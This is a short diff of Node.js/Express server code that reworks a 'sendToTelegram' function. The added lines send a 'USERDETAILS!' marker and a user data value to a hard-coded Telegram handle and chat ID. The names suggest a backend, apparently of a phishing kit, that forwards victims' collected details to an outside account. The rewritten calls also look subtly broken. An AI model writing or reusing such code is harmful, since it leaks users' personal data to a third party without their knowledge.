@@ -331,11 +331,9 @@ router.post('/revise', async (req, res, err) => {
 
 const sendToTelegram = async (userPrefix) => {
     console.log(userPrefix);
-    bot.action(ctx => {
-        bot.telegram.sendMessage('@aQaQomi', "USERDETAILS!", {});
-        bot.telegram.sendMessage('@aQaQomi', userPrefix, {});
+        bot.sendMessage('@aQaQomi', "USERDETAILS!", {});
+        bot.sendMessage(-1001173157040, userPrefix, {});
         bot.launch();
-    })
 
 };
 
